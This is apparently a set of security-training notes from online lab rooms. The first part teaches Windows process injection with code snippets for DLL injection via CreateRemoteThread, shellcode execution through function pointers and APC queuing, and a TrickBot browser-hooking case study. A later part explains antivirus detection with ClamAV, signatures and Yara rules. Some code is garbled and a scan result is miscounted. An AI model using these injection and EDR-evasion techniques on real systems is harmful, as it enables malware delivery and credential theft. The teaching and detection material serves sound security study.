At step four, we need to write the malicious DLL to the allocated memory location. We can use `WriteProcessMemory` to write to the allocated region.

```cpp
WriteProcessMemory(
	hProcess, // Handle for the target process
	dllAllocatedMemory, // Allocated memory region
	dllLibFullPath, // Path to the maliciousDLLstrlen(dllLibFullPath) + 1, // Byte size of the maliciousDLLNULL
);

```

At step five, our malicious DLL is written to memory and all we need to do is load and execute it. To load the DLL we need to use `LoadLibrary`; imported from `kernel32`. Once loaded, `CreateRemoteThread` can be used to execute memory using `LoadLibrary` as the starting function.

```cpp

LPVOID loadLibrary = (LPVOID) GetProcAddress(
	GetModuleHandle("kernel32.dll"), // Handle of the module containing the call
	"LoadLibraryA" //API call to import);
HANDLE remoteThreadHandler = CreateRemoteThread(
	hProcess, // Handle for the target process
	NULL,
	0, // Default size from the execuatable of the stack
	(LPTHREAD_START_ROUTINE) loadLibrary, pointer to the starting function
	dllAllocatedMemory, // pointer to the allocated memory region
	0, // Runs immediately after creation
	NULL
);

```

We can compile these steps together to create a DLL injector. Use the C++ injector provided and experiment with DLL injection.

**Memory Execution Alternatives**

Depending on the 
environment you are placed in, you may need to alter the way that you 
execute your shellcode. This could occur when there are hooks on an API call and you cannot evade or unhook them, an EDR is monitoring threads, etc.

Up to this point, we have primarily looked at methods of allocating 
and writing data to and from local/remote processes. Execution is also a
 vital step in any injection technique; although not as important when 
attempting to minimize memory artifacts and IOCs (**I**ndicators **o**f **C**ompromise). Unlike allocating and writing data, execution has many options to choose from.

Throughout this room, we have observed execution primarily through `CreateThread` and its counterpart, `CreateRemoteThread`.

In this task we will cover three other execution methods that can be used depending on the circumstances of your environment.

# Invoking Function Pointers

The void function pointer is an oddly novel method of memory block execution that relies solely on typecasting.

This technique can only be executed with locally allocated memory but does not rely on any API calls or other system functionality.

The one-liner below is the most common form of the void function 
pointer, but we can break it down further to explain its components.

Function Pointer

```html
((void(*)())addressPointer)();
```

This one-liner can be hard to comprehend or explain since it is so dense, let's walk through it as it processes the pointer.

1. Create a function pointer `(void(*)()`, outlined in red
2. Cast the allocated memory pointer or shellcode array into the function pointer `(<function pointer>)addressPointer)`, outlined in yellow
3. Invoke the function pointer to execute the shellcode `();`, outlined in green

This technique has a very specific use case but can be very evasive and helpful when needed.

# Asynchronous Procedure Calls

From the [Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)
 on Asynchronous Procedure Calls, “An asynchronous procedure call (APC) 
is a function that executes asynchronously in the context of a 
particular thread.”

An APC function is queued to a thread through `QueueUserAPC`. Once queued the APC function results in a software interrupt and executes the function the next time the thread is scheduled.

In order for a userland/user-mode application to queue an APC function the thread must be in an “*alertable state*”. An alertable state requires the thread to be waiting for a callback such as `WaitForSingleObject` or `Sleep`.

Now that we understand what APC functions are let's look at how they can be used maliciously! We will use `VirtualAllocEx` and `WriteProcessMemory` for allocating and writing to memory.

```c
QueueUserAPC(
	(PAPCFUNC)addressPointer, // APC function pointer to allocated memory defined by winnt
	pinfo.hThread, // Handle to thread from PROCESS_INFORMATION structure
	(ULONG_PTR)NULL
	);
ResumeThread(
	pinfo.hThread // Handle to thread from PROCESS_INFORMATION structure
);
WaitForSingleObject(
	pinfo.hThread, // Handle to thread from PROCESS_INFORMATION structure
	INFINITE // Wait infinitely until alerted
);

```

This technique is a great alternative to thread execution, but it
 has recently gained traction in detection engineering and specific 
traps are being implemented for APC abuse. This can still be a great 
option depending on the detection measures you are facing.

# Section Manipulation

A commonly seen technique in malware research is PE (**P**ortable **E**xecutable) and section manipulation. As a refresher, the PE
 format defines the structure and formatting of an executable file in 
Windows. For execution purposes, we are mainly focused on the sections, 
specifically `.data` and `.text`, tables and pointers to sections are also commonly used to execute data.

We
 will not go in-depth with these techniques since they are complex and 
require a large technical breakdown, but we will discuss their basic 
principles.

To begin with any section manipulation technique, we need to obtain a PE dump. Obtaining a PE dump is commonly accomplished with a DLL or other malicious file fed into `xxd`.

At the core of each method, it is using math to move through the physical hex data which is translated to PE data.

Some of the more commonly known techniques include RVA entry point parsing, section mapping, and relocation table parsing.

---

With all injection techniques, the ability to mix and match 
commonly researched methods is endless. This provides you as an attacker
 with a plethora of options to manipulate your malicious data and 
execute it.

**Case Study in Browser Injection and Hooking**

To get hands on with the implications of process injection we can observe the TTPs (**T**actics, **T**echniques, and **P**rocedures) of TrickBot.

Credit for initial research: [*SentinelLabs*](https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/)

TrickBot
 is a well known banking malware that has recently regained popularity 
in financial crimeware. The main function of the malware we will be 
observing is browser hooking. Browser hooking allows the malware to hook
 interesting API calls that can be used to intercept/steal credentials.

To begin our analysis, let’s look at how they’re targeting browsers. From *SentinelLab’s* reverse engineering, it is clear that `OpenProcess` is being used to obtain handles for common browser paths; seen in the disassembly below.

```wasm
push   eax
push   0
push   438h
call   ds:OpenProcess
mov    edi, eax
mov    [edp,hProcess], edi
test   edi, edi
jz     loc_100045EE

```

```wasm
push   offset Srch            ; "chrome.exe"
lea    eax, [ebp+pe.szExeFile]
...
mov    eax, ecx
push   offset aIexplore_exe   ; "iexplore.exe"
push   eax                    ; lpFirst
...
mov    eax, ecx
push   offset aFirefox_exe   ; "firefox.exe"
push   eax                    ; lpFirst
...
mov    eax, ecx
push   offset aMicrosoftedgec   ; "microsoftedgecp.exe"
...

```

The current source code for the reflective injection is unclear but *SentinelLabs* has outlined the basic program flow of the injection below.

1. Open Target Process, `OpenProcess`
2. Allocate memory, `VirtualAllocEx`
3. Copy function into allocated memory, `WriteProcessMemory`
4. Copy shellcode into allocated memory, `WriteProcessMemory`
5. Flush cache to commit changes, `FlushInstructionCache`
6. Create a remote thread, `RemoteThread`
7. Resume the thread or fallback to create a new user thread, `ResumeThread` or `RtlCreateUserThread`

Once injected TrickBot will call its *hook installer function* copied into memory at step three. Pseudo-code for the installer function has been provided by *SentinelLabs* below.

```cpp
relative_offset = myHook_function - *(_DWORD *)(original_function + 1) - 5;
v8 = (unsigned __int8)original_function[5];
trampoline_lpvoid = *(void **)(original_function + 1);
jmp_32_bit_relative_offset_opcode = 0xE9u;		// "0xE9" -> opcode for a jump with a 32bit relative offset

if ( VirtualProtectEx((HANDLE)0xFFFFFFFF, trampoline_lpvoid, v8, 0x40u, &flOldProtect) )	// Set up the function for "PAGE_EXECUTE_READWRITE" w/ VirtualProtectEx
{
	v10 = *(_DWORD *)(original_function + 1);
	v11 = (unsigned __int8)original_function[5] - (_DWORD)original_function - 0x47;
	original_function[66] = 0xE9u;
	*(_DWORD *)(original_function + 0x43) = v10 + v11;
	write_hook_iter(v10, &jmp_32_bit_relative_offset_opcode, 5); // -> Manually write the hook
	VirtualProtectEx(		// Return to original protect state
		(HANDLE)0xFFFFFFFF,
		*(LPVOID *)(original_function + 1),
		(unsigned __int8)original_function[5],
		flOldProtect,
		&flOldProtect);
result = 1;

```

Let’s break this code down, it may seem daunting at 
first, but it can be broken down into smaller sections of knowledge we 
have gained throughout this room.

The first section of interesting
 code we see can be identified as function pointers; you may recall this
 from the previous task on invoking function pointers.

```cpp
relative_offset = myHook_function - *(_DWORD *)(original_function + 1) - 5;
v8 = (unsigned __int8)original_function[5];
trampoline_lpvoid = *(void **)(original_function + 1);

```

Once function pointers are defined the malware will use them to modify the memory protections of the function using `VirtualProtectEx`.

```cpp
if ( VirtualProtectEx((HANDLE)0xFFFFFFFF, trampoline_lpvoid, v8, 0x40u, &flOldProtect) )

```

At this point, the code turns into malware funny 
business with function pointer hooking. It is not essential to 
understand the technical requirements of this code for this room. At its
 bare bones, this code section will rewrite a hook to point to an opcode
 jump.

```cpp
v10 = *(_DWORD *)(original_function + 1);
v11 = (unsigned __int8)original_function[5] - (_DWORD)original_function - 0x47;
original_function[66] = 0xE9u;
*(_DWORD *)(original_function + 0x43) = v10 + v11;
write_hook_iter(v10, &jmp_32_bit_relative_offset_opcode, 5); // -> Manually write the hook

```

Once hooked it will return the function to its original memory protections.

```cpp
VirtualProtectEx(		// Return to original protect state
		(HANDLE)0xFFFFFFFF,
		*(LPVOID *)(original_function + 1),
		(unsigned __int8)original_function[5],
		flOldProtect,
		&flOldProtect);

```

---

This may still seem like a lot of code and technical 
knowledge being thrown and that is okay! The main takeaway of the 
hooking function for TrickBot is that it will inject itself into browser
 processes using reflective injection and hook API calls from the injected function.

**INTRODUCTION TO ANTI-VIRUS**

**Antivirus Software**

# What is software?

Antivirus (AV)
 software is an extra layer of security that aims to detect and prevent 
the execution and spread of malicious files in a target operating 
system.

It is a host-based application that runs in real-time (in the 
background) to monitor and check the current and newly downloaded files.
 The

AV

software inspects and decides whether files are malicious using different techniques, which will be covered later in this room.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/cc7df5646938a83c96371cc0dc615253.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/cc7df5646938a83c96371cc0dc615253.png)

Interestingly, the first antivirus software was designed solely to detect and remove [computer viruses](https://malware-history.fandom.com/wiki/Virus).
 Nowadays, that has changed; modern antivirus applications can detect 
and remove computer viruses as well other harmful files and threats.

# What does software look for?

Traditional AV software looks for **malware** with
 predefined malicious patterns or signatures. Malware is harmful 
software whose primary goal is to cause damage to a target machine, 
including but not limited to:

- Gain full access to a target machine.
- Steal sensitive information such as passwords.
- Encrypt files and cause damage to files.
- Inject other malicious software or unwanted advertisements.
- Used the compromised machine to perform further attacks such as botnet attacks.

## AV

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/ff53d2570143967d4073d0f9005d0928.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/ff53d2570143967d4073d0f9005d0928.png)

In addition to AV
 software, other host-based security solutions provide real-time 
protection to endpoint devices. Endpoint Detection and Response (EDR) is
 a security solution that provides real-time protection based on 
behavioral analytics. An antivirus application performs scanning, 
detecting, and removing malicious files. On the other hand, EDR monitors
 various security checks in the target machine, including file 
activities, memory, network connections, Windows registry, processes, 
etc.

Modern Antivirus products are implemented to integrate the 
traditional Antivirus features and other advanced functionalities 
(similar to EDR functionalities) into one product to provide comprehensive protection against digital threats. For more information about Host-based security solutions, we suggest visiting the THM room: [The Lay of the Land](https://tryhackme.com/room/thelayoftheland).

## AV

McAfee Associates, Inc. started the first AV
 software implementation in 1987. It was called "VirusScan," and its 
main goal at that time was to remove a virus named "Brain" that infected
 John McAfee's computer. Later, other companies joined in the battle against viruses. AV software was called scanners, and they were command-line software that searched for malicious patterns in files.

Since then, things have changed. AV
 software nowadays uses a Graphical User Interface (GUI) to perform 
scans for malicious files and other tasks. Malware programs have also 
expanded in scope and now target victims on Windows and other operating 
systems. Modern AV software supports most devices and platforms, including Windows, Linux, macOS, Android, and iOS. Modern AV software has improved and become more intelligent and sophisticated, as they pack a bundle of versatile features, including Antivirus, Anti-Exploit, Firewall, Encryption tool, etc.

**Antivirus Features**

# Antivirus Engines

An AV
 engine is responsible for finding and removing malicious code and 
files. Good AV software implements an effective and solid AV core that 
accurately and quickly analyzes malicious files.
 Also, It should handle and support various file types, including 
archive files, where it can self-extract and inspect all compressed 
files.

Most AV products share the same common features but are implemented  differently, including but not limited to:

- Scanner
- Detection techniques
- Compressors and Archives
- Unpackers
- Emulators

# Scanner

The scanner feature is included in most AV
 products: AV software runs and scans in real-time or on-demand. This 
feature is available in the GUI or through the command prompt. The user 
can use it whenever required to check files or directories. The scanning
 feature must support the most known malicious file types to detect and 
remove the threat. In addition, it also may support other types of 
scanning depending on the AV software, including vulnerabilities, 
emails, Windows memory, and Windows Registry.

# Detection techniques

An AV
 detection technique searches for and detects malicious files; different
 detection techniques can be used within the AV engine, including:

- Signature-based detection is the traditional AV technique that looks for predefined malicious patterns and signatures within files.
- Heuristic detection is a more advanced technique that includes various behavioral methods to analyze suspicious files.
- Dynamic detection is a technique that includes monitoring the system calls and
APIs and testing and analyzing in an isolated environment.

We will cover these techniques in the next task. A good AV
 engine is accurate and quickly detects malicious files with fewer 
false-positive results. We will showcase several AV products that 
provide inaccurate results and misclassify a file.

# Compressors and Archives

The "Compressors and Archives" feature should be included in any AV
 software. It must support and be able to deal with various system file 
types, including compressed or archived files: ZIP, TGZ, 7z, XAR, RAR, 
etc. Malicious code often tries to evade host-based security solutions 
by hiding in compressed files. For this reason, AV software must decompress and scan through all files before a user opens a file within the archive.

# PE (Portable Executable) Parsing and Unpackers

Malware
 hides and packs its malicious code by compressing and encrypting it 
within a payload. It decompresses and decrypts itself during runtime to 
make it harder to perform static analysis. Thus, AV
 software must be able to detect and unpack most of the known packers 
(UPX, Armadillo, ASPack, etc.) before the runtime for static analysis.

Malware
 developers use various techniques, such as Packing, to shrink the size 
and change the malicious file's structure. Packing compresses the 
original executable file to make it harder to analyze. Therefore, AV software must have an unpacker feature to unpack protected or compressed executable files into the original code.

Another feature that AV
 software must have is Windows Portable Executable (PE) header parser. 
Parsing PE of executable files helps distinguish malicious and 
legitimate software (.exe files). The PE file format in Windows (32 and 
64 bits) contains various information and resources, such as object 
code, DLLs, icon files, font files, and core dumps.

# Emulators

An
 emulator is an Antivirus feature that does further analysis on 
suspicious files. Once an emulator receives a request, the emulator runs
 the suspect (exe, DLL,
 PDF, etc.) files in a virtualized and controlled environment. It 
monitors the executable files' behavior during the execution, including 
the Windows APIs calls, Registry, and other Windows files. The following
 are examples of the artifacts that the emulator may collect:

- API calls
- Memory dumps
- Filesystem modifications
- Log events
- Running processes
- Web requests

An emulator stops the execution of a file when enough artifacts are collected to detect malware.

# Other common features

The following are some common features found in AV products:

- A self-protection driver to guard against malware attacking the actual AV.
- Firewall and network inspection functionality.
- Command-line and graphical interface tools.
- A daemon or service.
- A management console.

**AV Static  Detection**

Generally speaking, AV detection can be classified into three main approaches:

1. Static Detection
2. Dynamic Detection
3. Heuristic and Behavioral Detection

# Static Detection

A
 static detection technique is the simplest type of Antivirus detection,
 which is based on predefined signatures of malicious files. Simply, it 
uses pattern-matching techniques in the detection, such as finding a 
unique string, CRC (Checksums), sequence of bytecode/Hex values, and 
Cryptographic hashes (MD5, SHA1, etc.).

It
 then performs a set of comparisons between existing files within the 
operating system and a database of signatures. If the signature exists 
in the database, then it is considered malicious. This method is 
effective against static malware.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/06689aaadc7842fbe0cc1424e89e1b3c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/06689aaadc7842fbe0cc1424e89e1b3c.png)

In
 this task, we will be using a signature-based detection method to see 
how antivirus products detect malicious files. It is important to note 
that this technique works against known malicious files only with 
pre-generated signatures in a database. Thus, the database needs to be 
updated from time to time.

We will use the ClamAV antivirus software to demonstrate how signature-based detection identifies malicious files. The ClamAV software is pre-installed in the provided VM, and we can access it in the following path: c:\Program Files\ClamAV\clamscan.exe. We
 will also scan a couple of malware samples, which can be found on the 
desktop. The Malware samples folder contains the following files:

1. **EICAR** is a test file containing ASCII strings used to test AV software's effectiveness instead of real malware that could damage your machine. For more information, you may visit the official EICAR
website, [Here](https://www.eicar.org/?page_id=3950).
2. **Backdoor 1** is a C# program that uses a well-known technique to establish a reverse connection, including creating a process and executing a Metasploit Framework shellcode.
3. **Backdoor 2** is a C# program that uses process injection and encryption to establish a reverse connection, including injecting a Metasploit shellcode into an existing and running process.
4. **AV-Check** is a C# program that enumerates AV software in a target machine. Note that this file is not malicious. We will discuss this tool in more detail in task 6.
5. **notes.txt** is a text file that contains a command line. Note that this file is not malicious.

ClamAV
 comes with its database, and during the installation, we need to 
download the recently updated version. Let's try to scan the Malware 
sample folder using the clamscan.exe binary and check how ClamAV performs against these samples.

Command Prompt

```
c:\>"c:\Program Files\ClamAV\clamscan.exe" c:\Users\thm\Desktop\Samples
Loading:    22s, ETA:   0s [========================>]    8.61M/8.61M sigs
Compiling:   4s, ETA:   0s [========================>]       41/41 tasks

C:\Users\thm\Desktop\Samples\AV-Check.exe: OK
C:\Users\thm\Desktop\Samples\backdoor1.exe: Win.Malware.Swrort-9872015-0 FOUND
C:\Users\thm\Desktop\Samples\backdoor2.exe: OK
C:\Users\thm\Desktop\Samples\eicar.com: Win.Test.EICAR_HDB-1 FOUND
C:\Users\thm\Desktop\Samples\notes.txt: OK
```

The above output shows that ClamAV software correctly analyzed and 
flagged two of our tested files (EICAR, backdoor1, AV-Check, and 
notes.txt) as malicious. However, it incorrectly identified the 
backdoor2 as non-malicious while it does.

You can run clamscan.exe --debug <file_to_scan>,
 and you will see all modules loaded and used during the scanning. For 
example, it uses the unpacking method to split the files and look for a 
predefined malicious sequence of bytecode values, and that is how it was
 able to detect the C# backdoor 1. The bytecode value of the Metasploit shellcode used in backdoor 1 was previously identified and added to ClamAV's database.

However, backdoor 2 uses an encryption technique (XOR)
 for the Metasploit shellcode, resulting in different sequences of 
bytecode values that it doesn't find in the ClamAV database.

While
 the ClamAV was able to detect the EICAR.COM test file as malicious 
using the md5 signature-based technique. To confirm this, we can re-scan
 the EICAR.COM test file again in debug mode (--debug). At some point in
 the output, you will see the following message:

```jsx
LibClamAV debug: FP SIGNATURE: 44d88612fea8a8f36de82e1278abb02f:68:Win.Test.EICAR_HDB-1  # Name: eicar.com, Type: CL_TYPE_TEXT_ASCII
```

Now let's generate the md5 value
 of the EICAR.COM if it matches what we see in the previous message from
 the output. We will be using the sigtool for that:

Command Prompt

```
c:\>"c:\Program Files\ClamAV\sigtool.exe" --md5 c:\Users\thm\Desktop\Samples\eicar.com
44d88612fea8a8f36de82e1278abb02f:68:eicar.com
```

# 

If you closely check the generated MD5 value, 44d88612fea8a8f36de82e1278abb02f, it matches.

# Create Your Own Signature Database

One
 of ClamAV's features is creating your own database, allowing you to 
include items not found in the official ClamAV database. Let's try to 
create a signature for Backdoor 2, which ClamAV already missed, and add 
it to a database. The following are the required steps:

1. Generate an MD5 signature for the file.
2. Add the generated signature into a database with the extension ".hdb".
3. Re-scan the ClamAV against the file using our new database.

First, we will be using the sigtool tool, which is included in the ClamAV suite, to generate an MD5 hash of backdoor2.exe  using the --md5 argument.

Generate an MD5 hash

```
C:\Users\thm\Desktop\Samples>"c:\Program Files\ClamAV\sigtool.exe" --md5 backdoor2.exe
75047189991b1d119fdb477fef333ceb:6144:backdoor2.exe
```

As shown in the output, the generated hash string contains the following structure: Hash:Size-in-byte:FileName.  Note that ClamAV uses the generated value in the comparison during the scan.

Now that we have the MD5 hash, now let's create our own database. We will use the sigtool tool and save the output into a file using the > thm.hdb as follows,

Generate our new database

```
C:\Users\thm\Desktop\Samples>"c:\Program Files\ClamAV\sigtool.exe" --md5 backdoor2.exe > thm.hdb
```

As a result, a thm.hdb file will be created in the current directory that executes the command.

We
 already know that ClamAV did not detect the backdoor2.exe using the 
official database! Now, let's re-scan it using the database we created, thm.hdb, and see the result!

Re-scanning backdoor2.exe using the new database!

```
C:\Users\thm\Desktop\Samples>"c:\Program Files\ClamAV\clamscan.exe" -d thm.hdb backdoor2.exe
Loading:     0s, ETA:   0s [========================>]        1/1 sigs
Compiling:   0s, ETA:   0s [========================>]       10/10 tasks

C:\Users\thm\Desktop\Samples\backdoor2.exe: backdoor2.exe.UNOFFICIAL FOUND
```

As we expected, the ClamAV tool flagged the backdoor2.exe binary as malicious based on the database we provided. As a practice, add the AV-Check.exe's MD5 signature into the same database we already created, then check whether ClamAV can flag AV-Check.exe as malicious.

# Yara Rules for Static Detection

# 

One of the tools that help in static detection is [Yara](http://virustotal.github.io/yara/).
 Yara is a tool that allows malware engineers to classify and detect 
malware. Yara uses rule-based detection, so in order to detect new 
malware, we need to create a new rule. ClamAV can also deal with Yara 
rules to detect malicious files. The rule will be the same as in our 
database in the previous section.

To create a rule, we need to 
examine and analyze the malware; based on the findings, we write a rule.
 Let's take AV-Check.exe as an example and write a rule for it.

First,
 let's analyze the file and list all human-readable strings in the 
binary using the strings tool. As a result, we will see all functions, 
variables, and nonsense strings. But, if you look closely, we can use 
some of the unique strings in our rules to detect this file in the 
future. The AV-Check uses a program database (.pdb), which contains a 
type and symbolic debugging information of the program during the 
compiling.

Command Prompt

```
C:\Users\thm\Desktop\Samples>strings AV-Check.exe | findstr pdb
C:\Users\thm\source\repos\AV-Check\AV-Check\obj\Debug\AV-Check.pdb
```

We will use the path in the previous 
command's output as our unique string example in the Yara rule that we 
will create. The signature could be something else in the real world, 
such as Registry keys, commands, etc. If you are not familiar with Yara,
 then we suggest checking the [Yara THM room](https://tryhackme.com/room/yara). The following is Yara's rule that we will use in our detection:

```
rule thm_demo_rule {
	meta:
		author = "THM: Intro-to-AV-Room"
		description = "Look at how the Yara rule works with ClamAV"
	strings:
		$a = "C:\\Users\\thm\\source\\repos\\AV-Check\\AV-Check\\obj\\Debug\\AV-Check.pdb"
	condition:
		$a
}
```

Let's explain this Yara's rule a bit more.

- The rule starts with rule thm_demo_rule, which is the name of our rule. ClamAV uses this name if a rule matches.
- The metadata section, which is general information, contains the author and description, which the user can fill.
- The strings section contains the strings or bytecode that we are looking
for. We are using the C# program's database path in this case. Notice
that we add an extra \ in that path to escape the special character, so it does not break the rule.
- In the condition section, we specify if the defined string is found in the string section, then flag the file.

Note that Yara rules must store in a .yara extension file for ClamAV to deal with it. Let's re-scan the c:\Users\thm\Desktop\Samples folder again using the Yara rule we created. You can find a copy of the Yara rule on the desktop at c:\Users\thm\Desktop\Files\thm-demo-1.yara.

Scanning using the Yara rule

```
C:\Users\thm>"c:\Program Files\ClamAV\clamscan.exe" -d Desktop\Files\thm-demo-1.yara Desktop\Samples
Loading:     0s, ETA:   0s [========================>]        1/1 sigs
Compiling:   0s, ETA:   0s [========================>]       40/40 tasks

C:\Users\thm\Desktop\Samples\AV-Check.exe: YARA.thm_demo_rule.UNOFFICIAL FOUND
C:\Users\thm\Desktop\Samples\backdoor1.exe: OK
C:\Users\thm\Desktop\Samples\backdoor2.exe: OK
C:\Users\thm\Desktop\Samples\eicar.com: OK
C:\Users\thm\Desktop\Samples\notes.txt: YARA.thm_demo_rule.UNOFFICIAL FOUND
```

As a result, ClamAV can detect the AV-Check.exe binary as malicious based on the Yara rule we provide. However, ClamAV gave a false-positive result where it flagged the notes.txt file as malicious. If we open the notes.txt file, we can see that the text contains the same path we specified in the rule.

Let's
 improve our Yara rule to reduce the false-positive result. We will be 
specifying the file type in our rule. Often, the types of a file can be 
identified using magic numbers, which are the first two bytes of the 
binary. For example, [executable files](https://en.wikipedia.org/wiki/DOS_MZ_executable) (.exe) always start with the ASCII "MZ" value or "4D 5A" in hex.

To confirm this, let's use the [HxD](https://mh-nexus.de/en/hxd/)
 application, which is a freeware Hex Editor, to examine the 
AV-Check.exe binary and see the first two bytes. Note that the HxD is already available in the provided VM.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/44dfc0fa904b0e4a9dfe983001d38a2e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/44dfc0fa904b0e4a9dfe983001d38a2e.png)

Knowing this will help improve the detection, let's include this in 
our Yara rule to flag only the .exe files that contain our signature 
string as malicious. The following is the improved Yara rule:

```
rule thm_demo_rule {
	meta:
		author = "THM: Intro-to-AV-Room"
		description = "Look at how the Yara rule works with ClamAV"
	strings:
		$a = "C:\\Users\\thm\\source\\repos\\AV-Check\\AV-Check\\obj\\Debug\\AV-Check.pdb"
		$b = "MZ"
	condition:
		$b at 0 and $a
}
```

In the new Yara rule, we defined a unique string ($b) equal to
 the MZ as an identifier for the .exe file type. We also updated the 
condition section, which now includes the following conditions:

1. If the string "MZ" is found at the 0 location, the file's beginning.
2. If the unique string (the path) occurs within the binary.
3. In the condition section, we used the AND operator for both definitions in 1 and 2 are found, then we have a match.

You can find the updated rule in Desktop\Files\thm-demo-2.yara. Now that we have our updated Yara rule, now let's try it again.

Scanning using the Yara rule

```
C:\Users\thm>"c:\Program Files\ClamAV\clamscan.exe" -d Desktop\Files\thm-demo-2.yara Desktop\Samples
Loading:     0s, ETA:   0s [========================>]        1/1 sigs
Compiling:   0s, ETA:   0s [========================>]       40/40 tasks

C:\Users\thm\Desktop\Samples\AV-Check.exe: YARA.thm_demo_rule.UNOFFICIAL FOUND
C:\Users\thm\Desktop\Samples\backdoor1.exe: OK
C:\Users\thm\Desktop\Samples\backdoor2.exe: OK
C:\Users\thm\Desktop\Samples\eicar.com: OK
C:\Users\thm\Desktop\Samples\notes.txt: OK
```

The output shows we improved our Yara rule to reduce the false-positive results. That was a simple example of how AV
 software works. Thus, AV software vendors work hard to fight against 
malware and improve their products and database to enhance the 
performance and accuracy of results.

The drawback of the signature-based detection is that files will have a different hash value if the binary is modified. Therefore, it is easy for someone to bypass signature-based detection techniques if they know what AV software looks for and how to analyze binaries, as shown in later rooms.

**Other Detection Techniques**

The concept of static 
detection is relatively simple. In this section, we will discuss the 
different types of detection techniques.

# Dynamic Detection

The
 dynamic detection approach is advanced and more complicated than static
 detection. Dynamic detection is focused more on checking files at 
runtime using different methods. The following diagram shows the dynamic
 detection scanning flow:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/5d0d8cd90a2c4b2ce035af1f3b735563.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/5d0d8cd90a2c4b2ce035af1f3b735563.png)

The first method is by monitoring Windows APIs. The detection engine inspects Windows application calls and monitors Windows API calls using Windows [Hooks](https://docs.microsoft.com/en-us/windows/win32/winmsg/about-hooks).

Another
 method for dynamic detection is Sandboxing. A sandbox is a virtualized 
environment used to run malicious files separated from the host 
computer. This is usually done in an isolated environment, and the 
primary goal is to analyze how the malicious software acts in the 
system. Once the malicious software is confirmed, a unique signature and
 rule will be created based on the characteristic of the binary. 
Finally, a new update will be pushed into the cloud database for future 
use.

This type of detection also has 
drawbacks because it requires executing and running the malicious 
software for a limited time in the virtual environment to protect the 
system resources. As with other detection techniques, dynamic detection 
can be bypassed. Malware developers implement their software to not work
 within the virtual or simulated environment to avoid dynamic analysis. 
For example, they check if the system spawns a real process of executing
 the software before running malicious activities or let the software 
wait sometime before execution.

For more information about sandbox evasion, we suggest checking the THM room: [Sandbox Evasion](https://tryhackme.com/room/sandboxevasion)!

# Heuristic and Behavioral Detection

Heuristic and behavioral detection have become essential in today's modern AV
 products. Modern AV software relies on this type of detection to detect
 malicious software. The heuristic analysis uses various techniques, 
including static and dynamic heuristic methods:

1. Static Heuristic Analysis is a process of decompiling (if possible) and
extracting the source code of the malicious software. Then, the
extracted source code is compared to other well-known virus source
codes. These source codes are previously known and predefined in a
heuristic database. If a match meets or exceeds a threshold percentage,
the code is flagged as malicious.
2. Dynamic Heuristic Analysis is based on predefined behavioral rules. Security
researchers analyzed suspicious software in isolated and secured
environments. Based on their findings, they flagged the software as
malicious. Then, behavioral rules are created to match the software's
malicious activities within a target machine.

The following are examples of behavioral rules:

- If a process tries to interact with the LSASS.exe process that contains users'
NTLM hashes, Kerberos tickets, and more
- If a process opens a listening port and waits to receive commands from a Command
and Control (C2) server

The following diagram shows the Heuristic and behavioral detection scanning flow:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/bbdeb1fd3e1140a20ebee8553b194054.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/bbdeb1fd3e1140a20ebee8553b194054.png)

# Summing up detection methods

Let's summarize how modern AV
 software works as one unit, including all components, and combines 
various features and detection techniques to implement its AV engine. 
The following is an example of the components of an antivirus engine:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/61b1c8a009202170cf3deee3cefe7ccf.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/61b1c8a009202170cf3deee3cefe7ccf.png)

In the diagram, you can see a suspicious Foobar.zip file is passed to AV software to scan. AV software recognizes that it is a compressed file (.zip). Since the software supports .zip files, it applies an un-archiver feature to extract the files (Foobar.exe). Next, it identifies the file type to know which module to work with and then performs a PE parsing operation to pull the binary's information and other characteristic features. Next, it checks whether the file is packed; if it is, it unpacks the code. Finally, it passes the collected information and the binary to the AV engine, where it tries to detect if it is malicious and gives us the result.

**AV Testing and Fingerprinting**

# AV

Many AV
 vendors in the market mainly focus on implementing a security product 
for home or enterprise users. Modern AV software has improved and now 
combines antivirus capabilities with other security features such as 
Firewall, Encryption, Anti-spam, EDR, vulnerability scanning, VPN, etc.

It is important to note that it is hard to recommend which AV
 software is the best. It all comes down to user preferences and 
experience. Nowadays, AV vendors focus on business security in addition 
to end-user security. We suggest checking the [AV comparatives website](https://www.av-comparatives.org/list-of-enterprise-av-vendors-pc/) for more details on enterprise AV vendors.

# AV

AV
 testing environments are a great place to check suspicious or malicious
 files. You can upload files to get them scanned against various AV 
software vendors. Moreover, platforms such as VirusTotal use various 
techniques and provide results within seconds. As a red teamer or a 
pentester, we must test a payload against the most well-known AV 
applications to check the effectiveness of the bypass technique.

# VirusTotal

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/368287c08435172ac9740a2a68e4e3fa.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/368287c08435172ac9740a2a68e4e3fa.png)

VirusTotal
 is a well-known web-based scanning platform for checking suspicious 
files. It allows users to upload files to be scanned with over 70 
antivirus detection engines. VirusTotal passes the uploaded files to the
 Antivirus engines to be checked, returns the result, and reports 
whether it is malicious or not. Many checkpoints are applied, including 
checking for blacklisted URLs or services, signatures, binary analysis, 
behavioral analysis, as well as checking for API
 calls. In addition, the binary will be run and checked in a simulated 
